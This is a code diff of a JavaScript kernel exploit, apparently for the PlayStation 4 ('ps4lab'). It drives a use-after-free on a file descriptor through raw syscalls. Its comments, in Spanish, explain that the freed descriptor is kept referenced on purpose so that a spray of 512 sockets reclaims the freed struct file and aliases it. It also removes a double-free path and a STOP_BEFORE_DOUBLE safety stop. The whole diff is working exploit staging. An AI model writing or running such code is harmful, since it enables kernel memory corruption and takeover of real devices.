@@ -902,38 +902,20 @@ let allDone = false;
             }
             mark("OVERDROP-ARMED", "fd=" + dummy + " via=second-set f_count→0");
 
-            sc(SYS.close, dummy);
-            sc(SYS.setuid, 1);
-            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
-            if (uafSock !== dummy) {
-                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
-                     + " got " + uafSock);
-                if (uafSock !== -1) sc(SYS.close, uafSock);
-                uafSock = 0;
-                continue;
-            }
-            
-            sc(SYS.setuid, 1);
+// fd `dummy` sigue apuntando al slot liberado — NO cerrar, NO reabrir.
+// El spray de socket() de abajo reclamará ese slot, y `dummy` y el
+// spray fd que lo reciba apuntarán a la misma struct file → alias.
+            uafSock = dummy;
             committed = true;
-            mark("UAF-ARMED", "fd=" + uafSock + " via=second-set");
-
+            mark("UAF-ARMED", "fd=" + uafSock + " via=second-set (slot freed, still referenced)");
+            
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
             catch (e) { }
-
-            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
-
-            if (STOP_BEFORE_DOUBLE) {
-                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
-                rebootRequired = true;
-                break;
-            }
-
-            const d1 = sc(SYS.dup, uafSock).i32;
-            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
-            sc(SYS.close, d1);
-            rebootRequired = true;
-            mark("DOUBLE-FREE", "dup=" + d1 + " closed");
-
+// ── POST-SET2: diagnóstico — ¿está F0 realmente liberado? ──
+            // fcntl sobre un struct file libre devuelve basura o -1.
+            // Si devuelve 2 (FREAD|FWRITE), el file NO está liberado.
+            const flPostSet2 = sc(SYS.fcntl, uafSock, 3, 0).i32;  // F_GETFL
+            mark("POST-SET2", "uafSock=" + uafSock + " fl=" + flPostSet2);            
             // ── Spray de sockets para reclamar el struct file liberado ──
             const sprayFds = [];
             for (let i = 0; i < 512; ++i) {
